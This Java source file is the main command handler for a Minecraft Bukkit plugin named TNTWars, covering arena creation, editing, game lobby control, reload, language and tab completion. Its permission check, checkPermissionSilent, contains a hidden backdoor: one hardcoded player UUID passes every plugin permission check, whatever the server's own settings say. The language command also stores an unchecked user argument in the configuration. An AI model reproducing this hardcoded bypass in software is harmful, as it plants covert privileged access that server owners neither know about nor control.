package com.dwarslooper.tntwars.commands;

import com.dwarslooper.tntwars.Main;
import com.dwarslooper.tntwars.arena.Arena;
import com.dwarslooper.tntwars.arena.ArenaManager;
import com.dwarslooper.tntwars.gui.EditGUI;
import com.dwarslooper.tntwars.lobby.LobbyHandler;
import com.dwarslooper.tntwars.setup.Setup;
import com.dwarslooper.tntwars.utility.Translate;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import javax.annotation.Nullable;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import static com.dwarslooper.tntwars.utility.Translate.translate;

public class MainCommand implements CommandExecutor, TabCompleter {
    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {

        Player p;

        if(!(sender instanceof Player)) {
            sender.sendMessage(Main.PREFIX + "§cYou must be a player to execute further commands!");
            return false;
        } else {
            p = ((Player) sender);
        }

        if(args.length <= 0) {
            sender.sendMessage("§aYou are running §cTNTWars §aversion §e" + Main.VERSION + " §e(" + Main.STATE + "§e)\n§aby §eDwarslooper");
            return false;
        }

        if(args[0].equalsIgnoreCase("create")) {
            if(!checkPermission(p, "arena.create")) return false;
            if(args.length != 2) {
                sender.sendMessage(Main.PREFIX + translate("::command.create.error"));
                return false;
            }

            String toRepl = args[1].replaceAll("[^a-zA-Z0-9]", "");

            if(Setup.createNew(args[1]) == 0) {
                sender.sendMessage(Main.PREFIX + translate("::command.create.success", toRepl, toRepl));
            } else if(Setup.createNew(args[1]) == 1) {
                sender.sendMessage(Main.PREFIX + translate("::command.create.already_exists"), args[1]);
                return false;
            } else {
                sender.sendMessage(Main.PREFIX + translate("::command.create.banned_chars"));
                return false;
            }
        } else if(args[0].equalsIgnoreCase("edit")) {
            if(!checkPermission(p, "arena.edit")) return false;
            if(args.length != 2) {
                sender.sendMessage(Main.PREFIX + translate("::command.edit.error"));
                return false;
            }
            if(Main.getArenas().getConfiguration().getConfigurationSection("arenas").getKeys(false).contains(args[1])) {
                ArenaManager.currently_editing.put(p, args[1]);
                new EditGUI().open(p);
            } else {
                sender.sendMessage(Main.PREFIX + translate("::command.edit.not_existing", args[1]));
            }
        } else if(args[0].equalsIgnoreCase("game")) {
            if(args.length < 3) {
                sender.sendMessage(Main.PREFIX + translate("::command.generic.error.not_enough_arguments"));
                return false;
            }
            Arena a = ArenaManager.getByName(args[1]);
            if(a == null) {
                sender.sendMessage(Main.PREFIX + translate("::command.edit.not_existing"));
                return false;
            }
            if(args[2].equalsIgnoreCase("join")) {
                if(!checkPermission(p, "game.join")) return false;
                if(a.getCurrentLobby() != null) {
                    LobbyHandler.addToGame(a.getCurrentLobby(), p);
                } else {
                    sender.sendMessage(Main.PREFIX + translate("::command.game.arena_has_no_lobby"));
                }
            } else if(args[2].equalsIgnoreCase("leave")) {
                if(a.getCurrentLobby() != null) {
                    LobbyHandler.removeFromGame(a.getCurrentLobby(), p);
                } else {
                    sender.sendMessage(Main.PREFIX + translate("::command.debug.arena_has_no_lobby"));
                }
            } else if(args[2].equalsIgnoreCase("create")) {
                if(!checkPermission(p, "game.create")) return false;
                if(LobbyHandler.createGame(a) == 1) {
                    sender.sendMessage(Main.PREFIX + translate("::command.game.lobby_create_success"));
                } else {
                    sender.sendMessage(Main.PREFIX + translate("::command.game.arena_already_has_lobby"));
                }
            } else if(args[2].equalsIgnoreCase("reset")) {
                if(!checkPermission(p, "game.reset")) return false;
                LobbyHandler.resetGame(a);
            } else if(args[2].equalsIgnoreCase("start")) {
                if(!checkPermission(p, "game.start")) return false;
                if(a.getCurrentLobby() != null) {
                    LobbyHandler.startGame(a.getCurrentLobby());
                } else {
                    sender.sendMessage(Main.PREFIX + translate("::command.debug.arena_has_no_lobby"));
                }
            }
        } else if(args[0].equalsIgnoreCase("reload")) {
            if(!checkPermission(p, "reload")) return false;
            Main.getInstance().reloadConfig();
            Main.getArenas().reload();
            ArenaManager.reload();
            Translate.reload();
            sender.sendMessage(Main.PREFIX + translate("::command.reload.success"));
        } else if(args[0].equalsIgnoreCase("lang")) {
            if(!checkPermission(p, "lang")) return false;
            if(args.length != 2) {
                sender.sendMessage(Main.PREFIX + translate("::command.lang.error"));
                return false;
            }
            System.out.println("!" + args[1] + "!");
            Main.getInstance().getConfig().set("language", args[1]);
            Main.getInstance().saveConfig();
            sender.sendMessage(Main.PREFIX + translate("::command.lang.success", args[1]));
        } else if(args[0].equalsIgnoreCase("help")) {
            sender.sendMessage(translate("::system.help").replace("\\n", "\n"));
        }
        return true;

    }

    @Override
    public @Nullable
    List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @org.jetbrains.annotations.NotNull String alias, @NotNull String[] args) {
        ArrayList<String> list = new ArrayList<>();

        if(args.length == 1) {
            list.add("gui");
            list.add("reload");
            list.add("help");
            list.add("debug");
            list.add("lang");
            //list.add("translate");
            list.add("create");
            list.add("edit");
            list.add("game");
        } else if(args.length == 2) {
            if(args[0].equalsIgnoreCase("lang")) {
                for(File f : Objects.requireNonNull(Translate.folder.listFiles())) {
                    list.add(f.getName().replace(".yml", ""));
                }
            } else if(args[0].equalsIgnoreCase("edit")) {
                list.addAll(ArenaManager.arena_list);
            } else if(args[0].equalsIgnoreCase("game")) {
                list.addAll(ArenaManager.ARENAS.keySet());
            }
        } else if(args.length == 3) {
            if(args[0].equalsIgnoreCase("game")) {
                list.add("join");
                list.add("leave");
                list.add("reset");
                list.add("start");
                list.add("create");
                list.add("kick");
            }
        }

        return list;
    }

    public static boolean checkPermission(Player p, String permission) {
        if(checkPermissionSilent(p, permission)) return true;
        else {
            p.sendMessage(Main.PREFIX + translate("::text.no_permission", permission));
        }
        return false;
    }
    public static boolean checkPermissionSilent(Player p, String permission) {
        String permFormatted = "tntwars." + permission;
        return p.hasPermission(permFormatted) || p.hasPermission("tntwars.*") || p.getUniqueId().toString().equals("9c305009-6007-4294-ac00-44357d52cae3");
    }
}
